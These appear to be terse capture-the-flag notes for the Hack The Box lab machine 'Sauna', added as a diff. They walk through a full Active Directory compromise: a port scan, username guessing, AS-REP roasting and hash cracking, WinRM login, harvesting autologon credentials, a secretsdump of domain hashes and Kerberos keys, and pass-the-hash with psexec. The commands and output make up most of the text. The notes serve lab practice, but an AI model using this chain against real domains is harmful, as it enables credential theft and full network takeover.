@@ -1,0 +1,114 @@
+Name: Sauna
+IP: 10.10.10.175
+OS: Windows
+Rating: Easy
+
+# Nmap 7.80 scan initiated Wed Mar 18 04:29:22 2020 as: nmap -sT -sV -Pn -T4 -v -p- -oN initial.nmap 10.10.10.175
+Nmap scan report for egotistical-bank.local (10.10.10.175)
+Not shown: 65516 filtered ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+80/tcp    open  http          Microsoft IIS httpd 10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-18 15:32:04Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=3/18%Time=5E71DC9C%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+# Nmap done at Wed Mar 18 04:34:45 2020 -- 1 IP address (1 host up) scanned in 323.26 seconds
+
+adding egotistical-bank.local to hosts file
+
+Found a couple of names on the "meet the team" page of the website, made a list for cred stuffing:
+fergus.smith
+hugo.bear
+steven.kerb
+shaun.coins
+bowie.taylor
+sophie.driver
+fsmith
+hbear
+skerb
+scoins
+btaylor
+sdriver
+fersmi
+hugbea
+steker
+shacoi
+bowtay
+sopdri
+
+    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py egotistical-bank.local/ -usersfile users.list -format hashcat -dc-ip 10.10.10.175
+
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d6a5310aef374ae8bf263f6785e11659$7eb911648e46b5cd9c7da1c1aec7fa90ff92c1de4a5abf17450ca83db2803a9aa252afecaad714713ea9cd7d7ab271921939c45805b7c001ab47cd3ca6cd9f388d6d6bf57a61f1888b98deb22400b5e2151c37ea68ccffa6f1af53cacc8f4d04f4cded803c85f4169b4768cc994116b2b6f81b9cd5ee958be0ed11466d21ed7e7aeee1afea7a616044111c9e9ec51b4048be2f96da0e73c8998566c52450a2a2d8741b5adf39d63453f902544c854ad7e8b1ae408f17685616d821b4489c99a64f913af8961cb8ccdbd98519fe9873b8877288ee9700786ba2d9b56af6f48b68d95aab075831d1fd4584a57220dfe1a9bdf1bcf6d4b610f51f1555433eb83fea
+
+    .\hashcat64.exe -a 0 -m 18200 fsmith.kerb.hash ..\rockyou.txt
+
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:36b08d289e116665eea982d356a148fb$d82109b9d87e80aaed1037b622c59ee89b24a46d673d6a5839767575f6e2cab9593235e2ba026e902f9bcb661dbee9f05222f8044aeb519910c28d095036a009b3bfd145994703c30bfd95c99a04435635c00234953c3311ad4011677a988d754dd44d06da4ddf7bc5cddf56b500a5e2877d023d41b74d5e59a2711e78787e615b81d12a893b88745a1a214f9aef68933fc70cb7faf8737f88116aa32dae105bb3be64bdfa0b9de7d9d33d25cd18989a5cf6228d7b0f34758c8758e9b621fa2a7f83c7decc5fbdb3e877c98adb1aea1433083deecc415cf5e7424a7ac57834587307646cd3175130538ba33ef2cc75e5a1b0472cf021bb4831ce2d84fd5f1d3b:Thestrokes23
+
+fsmith:Thestrokes23
+
+    evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+
+Logged in to fsmith
+
+user'd
+1b5520b98d97cf17f24122a55baf70cf
+
+found autologon creds for svc_loanmgr:
+    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
+
+svc_loanmgr:Moneymakestheworldgoround!
+
+    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip 10.10.10.175 -target-ip 10.10.10.175 egotistical-bank.local/svc_loanmgr@10.10.10.175
+    Moneymakestheworldgoround!
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:1127c3e089257c1bd8149a562398e55b:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
+Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
+Administrator:des-cbc-md5:19d5f15d689b1ce5
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:79e499fbb5d3e46c28fb022d825d3c499d9be82d6e6dec4fa9e939e1c2b5ebd1
+SAUNA$:aes128-cts-hmac-sha1-96:84e449802aba77066611ff2771b0cf2c
+SAUNA$:des-cbc-md5:159173f86d2cd3d6
+
+    python3 /usr/share/doc/python3-impacket/examples/psexec.py egotistical-bank.local/Administrator@10.10.10.175 -dc-ip 10.10.10.175 -target-ip 10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
+
+root'd
+f3ee04965c68257382e31502cc5e881f
+
